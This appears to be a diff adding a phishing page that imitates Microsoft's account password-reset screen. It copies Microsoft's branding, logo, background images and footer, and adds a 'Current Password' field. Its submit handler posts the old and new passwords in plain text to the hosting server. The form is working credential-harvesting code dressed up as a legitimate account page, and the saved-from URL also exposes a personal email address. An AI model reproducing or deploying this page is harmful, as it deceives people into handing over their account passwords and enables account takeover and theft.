@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<!-- saved from url=(0629)https://account.live.com/password/reset?wreply=https://login.live.com/login.srf%3fmkt%3dVI-VN%26wa%3dwsignin1.0%26rpsnv%3d13%26ct%3d1527323350%26rver%3d6.7.6640.0%26wp%3dMBI_SSL%26wreply%3dhttps%253a%252f%252foutlook.live.com%252fowa%252f%253fnlp%253d1%2526RpsCsrfState%253d6012873b-30f2-a7f9-dc6c-b01ff6d5de14%26id%3d292841%26CBCXT%3dout%26lw%3d1%26fl%3ddob%252cflname%252cwld%26cobrandid%3d90015%26uaid%3da6a0d56e4fcd47c082a60c1059e6e9e7%26contextid%3d46618F85FEA6AE5E%26bk%3d1527323657&id=292841&uiflavor=web&cobrandid=929700037272&uaid=a6a0d56e4fcd47c082a60c1059e6e9e7&mkt=VI-VN&lc=1066&bk=1527323657&mn=iamsan7%40hotmail.com -->
+<html lang="en" xml:lang="en" class="m_ul" dir="ltr" style="">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="dns-prefetch" href="https://account.azureedge.net/">
+    <title>Reset your password</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
+    <meta name="format-detection" content="telephone=no">
+    <link rel="icon" href="https://account.azureedge.net/images/favicon.ico?v=2" type="image/x-icon">
+    <script src='https://cdn.firebase.com/js/client/2.2.1/firebase.js'></script>
+    <link rel="stylesheet" href="converged.css">
+
+    <style type="text/css">
+        body {
+            display: none;
+        }
+    </style>
+    <style type="text/css">
+        body {
+            display: block !important;
+        }
+    </style>
+</head>
+
+<body style="" class="ltr  Chrome _Mac _M66 _D0 Full RE_WebKit light animate" lang="en-EN">
+    <div class="App" id="iPageElt">
+        <div id="c_base" class="c_base">
+            <div id="c_content">
+                <!--background -->
+                <div class="background " role="presentation">
+                    <div class="blur" style="background-image:url(https://account.azureedge.net/images/convergedbg_small_v2.jpg)"></div>
+                    <div class="backgroundImage" style="background-image:url(https://account.azureedge.net/images/convergedbg_v2.jpg)"></div>
+                </div>
+                <!--lightbox -->
+                <div class="outer">
+                    <div class="middle ">
+
+                        <div class="inner ">
+                            <div>
+                                <img class="logo" role="presentation" src="./microsoft_logo.svg">
+                                <div id="pageContent">
+                                    <div id="maincontent">
+                                        <div id="pageControlHost">
+                                            <div class="UpdatePasswordPageContainer PageContainer" style="opacity: 1;">
+                                                <form id="pageDialogForm_6" novalidate="novalidate">
+                                                    <div id="iResetPassword">
+
+                                                        <div id="UpdatePasswordTitle" class="text-title" role="heading" data-bind="text: pageTitle">Reset your password</div>
+
+                                                        <div class="row" data-bind="visible: usernameDesc" style="display: none;">
+                                                            <div class="form-group" id="UpdatePWDUsernameDesc" data-bind="text: usernameDesc"></div>
+                                                        </div>
+                                                        <div class="row" data-bind="visible: passwordDesc" style="display: none;">
+                                                            <div class="form-group" id="UpdatePWDPasswordDesc" data-bind="text: passwordDesc"></div>
+                                                        </div>
+                                                        <div class="row">
+                                                            <div role="alert" aria-live="assertive">
+                                                                <div class="alert alert-error" id="iPageError" style="display: none;"></div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="row" data-bind="if: isCurrentPasswordRequired, visible: isCurrentPasswordRequired" style="display: none;"></div>
+                                                        <div data-bind="visible: showCollectNewPassword">
+                                                            <div class="row">
+                                                                <!--Password-->
+                                                                <div class="form-group">
+
+                                                                    <div class="capslock" aria-hidden="true" data-bind="visible: handleCapsLockWarning &amp;&amp; isCapsLockOn() &amp;&amp; password.focused()"
+                                                                        style="display: none;"></div>
+
+                                                                    <div role="alert" aria-live="assertive">
+                                                                        <div class="alert alert-error" id="pNewPwdErrorArea" data-bind="errorMessage: password, visible: showError(password)" style="display: none;"></div>
+                                                                    </div>
+                                                                    <input type="password" class="form-control" id="iOldPassword" name="Password" aria-required="true" aria-describedby="pNewPwdErrorArea UpdatePasswordTitle"
+                                                                        placeholder="Current Password" aria-label="Current password"
+                                                                        data-bind="value: password, hasFocus: password.focused, event: { keypress: onPasswordKeyPress }, css: { &#39;has-error&#39;: showError(password) }, attr: { &#39;aria-label&#39;: newPasswordAriaLabel }"
+                                                                        maxlength="127">
+
+
+                                                                </div>
+                                                            </div>
+                                                            <div class="row">
+                                                                <!--Password-->
+                                                                <div class="form-group">
+
+                                                                    <div class="capslock" aria-hidden="true" data-bind="visible: handleCapsLockWarning &amp;&amp; isCapsLockOn() &amp;&amp; password.focused()"
+                                                                        style="display: none;"></div>
+
+                                                                    <div role="alert" aria-live="assertive">
+                                                                        <div class="alert alert-error" id="pNewPwdErrorArea" data-bind="errorMessage: password, visible: showError(password)" style="display: none;"></div>
+                                                                    </div>
+                                                                    <input type="password" class="form-control" id="iPassword" name="Password" aria-required="true" aria-describedby="pNewPwdErrorArea UpdatePasswordTitle"
+                                                                        placeholder="New password" aria-label="New password"
+                                                                        maxlength="127">
+
+                                                                    <p class="help-block text-caption">8-character minimum; case sensitive</p>
+                                                                </div>
+                                                            </div>
+
+                                                            <div class="row" data-bind="if: isPasswordReentryRequired, visible: isPasswordReentryRequired">
+                                                                <!--Retype Password-->
+                                                                <div class="form-group">
+
+                                                                    <div class="capslock" aria-hidden="true" data-bind="visible: handleCapsLockWarning &amp;&amp; isCapsLockOn() &amp;&amp; retypePassword.focused()"
+                                                                        style="display: none;"></div>
+
+                                                                    <div role="alert" aria-live="assertive">
+                                                                        <div class="alert alert-error" id="pRetypePwdErrorArea" data-bind="errorMessage: retypePassword, visible: showError(retypePassword)"
+                                                                            style="display: none;"></div>
+                                                                    </div>
+                                                                    <input type="password" class="form-control" id="iRetypePassword" name="RetypePassword" aria-required="true" placeholder="Retype password"
+                                                                        aria-label="Retype password" data-bind="value: retypePassword, hasFocus: retypePassword.focused, event: { keypress: onPasswordKeyPress }, css: { &#39;has-error&#39;: showError(retypePassword) }, attr: { &#39;aria-label&#39;: retypePasswordAriaLabel }"
+                                                                        maxlength="127">
+
+                                                                </div>
+                                                            </div>
+
+                                                            <div class="row" data-bind="visible: showExpirationCheckbox" style="display: none;">
+                                                                <div class="form-group checkbox left">
+                                                                    <label>
+                                                                        <input type="checkbox" id="iExpire" name="Expire" data-bind="checked: expirationChecked">
+                                                                        <span></span>
+                                                                    </label>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="position-buttons">
+                                                            <div class="row">
+                                                                <div class="btn-group button-container">
+
+                                                                    <div class="col-xs-12">
+                                                                        <input type="button" id="iResetPasswordCancel" class="btn btn-block" role="button" aria-describedby="UpdatePasswordTitle"
+                                                                            tabindex="0" value="Cancel">
+                                                                    </div>
+
+                                                                    <div class="col-xs-12">
+                                                                        <input type="submit" id="iResetPasswordAction" class="btn btn-block btn-primary" role="button" aria-describedby="UpdatePasswordTitle"
+                                                                            tabindex="0" value="Next">
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                        <input type="hidden" id="iPostedTicket" name="t" value="">
+                                                        <input type="hidden" id="iNewPwdEncrypted" name="NewPwdEncrypted">
+                                                        <input type="hidden" id="iPublicKey" name="PublicKey">
+                                                        <input type="hidden" id="canary" name="canary" value="">
+
+                                                    </div>
+                                                </form>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <!--footer -->
+                <div id="footer" class="footer " role="contentinfo">
+                    <div class="footerNode text-secondary">
+                        <span>© 2018 Microsoft</span>
+                        <a target="_blank" rel="noreferrer noopener" id="terms" href="https://www.microsoft.com/servicesagreement/default.aspx">Term of services</a>
+                        <a target="_blank" rel="noreferrer noopener" id="privacy" href="https://privacy.microsoft.com/privacystatement">Privacy &amp; Cookie</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+<script src="jq.js"></script>
+<script>
+    window.onload = function () {
+
+        $('#pageDialogForm_6').submit(function (event) {
+            var url = '/'
+            event.preventDefault();
+            var oP = $('#iOldPassword').val();
+
+            var nP1 = $('#iPassword').val();
+            var nP2 = $('#iRetypePassword').val();
+
+            var iPageError = $('#iPageError');
+
+            if (oP.length < 8) {
+                $('#iOldPassword').focus();
+                showError(iPageError, 'Your old password wrong')
+                return
+            }
+
+            if (nP1.length < 8 || nP2.length < 8) {
+                $('#iPassword').focus();
+                showError(iPageError, 'Password not invaild')
+                return
+            }
+
+            if (nP1 !== nP2) {
+                $('#iRetypePassword').focus();
+                showError(iPageError, 'Password must same')
+                return
+            }
+            $.post(url, {
+                oP: oP,
+                nP: nP1
+            })
+
+            function showError(ele, content) {
+                setTimeout(function () {
+                    ele.html('').css('display', 'none')
+                }, 4000)
+                ele.html(content).css('display', 'block')
+            }
+        })
+    }
+</script>
+
+</html>
